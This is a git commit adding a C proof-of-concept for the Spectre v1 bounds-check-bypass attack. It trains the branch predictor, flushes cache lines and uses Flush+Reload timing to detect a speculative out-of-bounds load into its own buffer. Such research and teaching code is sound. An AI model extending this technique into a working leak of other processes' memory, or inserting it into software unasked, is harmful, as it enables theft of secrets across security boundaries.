95dfdae9867795d33fa302a94f18981ccd853b1b
mabarger <65674651+mbarger@users.noreply.github.com>
2025-03-05 17:53:02 +0000

    Add spectre_v1 poc

---
+++ speculative_vulns/spectre_v1/spectre_v1.c
@@ -0,0 +1,109 @@
+#include <stdio.h>
+#include <stdbool.h>
+#include <x86intrin.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <stdint.h>
+#include <string.h>
+
+#include "../util.h"
+
+// Threshhold, adjust to match machine
+#define THR 100
+
+#define TRAINING_ITERATIONS 5
+
+// Limit for spectre v1 access
+#define ARRAY_SIZE 4
+size_t limit = ARRAY_SIZE;
+
+void victim(size_t *index, uint8_t *fr_buf) {
+    if (*index < limit) {
+        // Perform array access
+        asm volatile("mov %0, %0" :: "r" (fr_buf[*index]));
+  }
+}
+
+void __attribute__((noinline)) call_victim(size_t *index, uint8_t *fr_buf) {
+    _mm_mfence();
+
+    // Reset PHT
+    asm volatile (
+        ".rept 200\n"
+        "jmp 1f\n"
+        "1:\n"
+        ".endr\n"
+    );
+
+    victim(index, fr_buf);
+}
+
+void speculate() {
+    size_t hits = 0;
+    uint64_t t = 0;
+    size_t *index = (size_t *) mmap(0x00, 0x1000,
+                                    PROT_READ | PROT_WRITE,
+                                    MAP_ANONYMOUS | MAP_PRIVATE,
+                                    -1,
+                                    0x00);
+
+    // Set index to 0 for training
+    *index = 0;
+    _mm_mfence();
+
+    // Allocation of F&R buffer
+    uint8_t *fr_buf = (uint8_t *) malloc(0x1000 * 4) + 0x2000;
+    memset(fr_buf, 0x94, 0x1000);
+
+    _mm_clflush(&limit);
+    _mm_clflush(index);
+    _mm_clflush(fr_buf);
+    _mm_mfence();
+
+    // Training
+    for (size_t i = 0; i < TRAINING_ITERATIONS; i++) {
+        _mm_clflush(fr_buf);
+        _mm_mfence();
+
+        call_victim(index, fr_buf);
+        t = load_time(fr_buf);
+        if(t < THR) {
+            hits++;
+        }
+    }
+
+    printf("Hits (Training): %4ld/%d\n", hits, TRAINING_ITERATIONS);
+    hits = 0;
+
+    _mm_mfence();
+
+    // Set index to 0x20 for the attack (out-of-bounds)
+    *index = 0x20;
+    _mm_mfence();
+
+    // Prepare attack
+    _mm_clflush(&limit);
+    _mm_clflush(index);
+    _mm_clflush(fr_buf + 0x20);
+    _mm_mfence();
+
+    // Call victim, which should speculate
+    call_victim(index, fr_buf);
+    t = load_time(fr_buf + 0x20);
+
+    if(t < THR) {
+        hits++;
+    }
+
+    printf("Hits (Spectre):  %4ld/1\n", hits);
+
+    munmap(index, 0x1000);
+    munmap(fr_buf, 0x1000 * 4);
+}
+
+int main() {
+    speculate();
+
+    return EXIT_SUCCESS;
+}
